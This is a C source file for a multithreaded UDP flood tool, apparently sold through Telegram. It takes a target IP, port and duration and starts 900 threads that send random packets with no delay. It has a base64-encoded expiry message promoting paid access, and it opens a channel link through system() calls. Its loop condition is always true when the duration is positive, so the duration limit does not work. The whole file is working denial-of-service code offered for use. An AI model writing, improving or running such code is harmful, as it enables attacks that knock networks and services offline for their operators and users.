#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ctype.h>

#define MAX_PACKET_SIZE 1400
#define THREADS 900

char *ip;
int port;
int duration;
char padding_data[2 * 1024 * 1024]; // 2 MB padding

void base64_decode(const char *encoded, char *decoded) {
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, in_len = strlen(encoded), in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && (encoded[in_] != '=') && (isalnum(encoded[in_]) || (encoded[in_] == '+') || (encoded[in_] == '/'))) {
        char_array_4[i++] = encoded[in_++];
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = strchr(base64_chars, char_array_4[i]) - base64_chars;
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) decoded[j++] = char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 4; k++) char_array_4[k] = 0;
        for (int k = 0; k < 4; k++) char_array_4[k] = strchr(base64_chars, char_array_4[k]) - base64_chars;
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (int k = 0; k < (i - 1); k++) decoded[j++] = char_array_3[k];
    }
    decoded[j] = '\0';
}

int is_expired() {
    struct tm expiry_date = {0};
    time_t now;
    double seconds;

    expiry_date.tm_year = 2028 - 1900;
    expiry_date.tm_mon = 7;
    expiry_date.tm_mday = 13;

    time(&now);
    seconds = difftime(mktime(&expiry_date), now);
    return seconds < 0;
}

void open_url(const char *url) {
    if (system("command -v xdg-open > /dev/null") == 0) system("xdg-open https://t.me/SOULCRACKS");
    else if (system("command -v gnome-open > /dev/null") == 0) system("gnome-open https://t.me/SOULCRACKS");
    else if (system("command -v open > /dev/null") == 0) system("open https://t.me/SOULCRACKS");
    else if (system("command -v start > /dev/null") == 0) system("start https://t.me/SOULCRACKS");
    else fprintf(stderr, "My channel link https://t.me/SOULCRACKS\n");
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[MAX_PACKET_SIZE];
    int sent_bytes;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    // Seeds rand with unique seed per thread/time to get varying random data
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)pthread_self();

    while (time(NULL) < (time(NULL) + duration)) {
        // Fill buffer with random bytes every iteration for max chaos
        for (int i = 0; i < MAX_PACKET_SIZE; i++) {
            buffer[i] = (char)(rand_r(&seed) % 256);
        }

        sent_bytes = sendto(sock, buffer, MAX_PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("Send failed");
            break;
        }
        // No delay for max throughput
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <ip> <port> <duration_sec>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    if (is_expired()) {
        const char *encoded_err = "VGhpcyBmaWxlIGlzIGNsb3NlZCBAVklQTU9EU1hBRE1JTgpUaGlzIGlzIGZyZWUgdmVyc2lvbgpETSB0byBidXkKQFZJUE1PRFNYQURNSU4=";
        char decoded_err[512];
        base64_decode(encoded_err, decoded_err);
        fprintf(stderr, "Error: %s\n", decoded_err);
        open_url("https://t.me/SOULCRACKS");
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    printf("Starting powerful UDP flood: IP=%s, Port=%d, Duration=%d sec, Threads=%d\n", ip, port, duration, THREADS);

    const char *encoded_watermark = "QHRlbGVncmFtIGNoYW5uZWwgQFNPVUxDUkFDS1MgVklQTU9EU1hBRE1JTiBUZXJtcyBvZiBzZXJ2aWNlIHVzZSBhbmQgbGVnYWwgY29uc2lkZXJhdGlvbnMu";
    char decoded_watermark[256];
    base64_decode(encoded_watermark, decoded_watermark);
    printf("Watermark: %s\n", decoded_watermark);

    memset(padding_data, 0, sizeof(padding_data));

    pthread_t tid[THREADS];
    for (int i = 0; i < THREADS; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("Flood finished.\n");

    return 0;
}
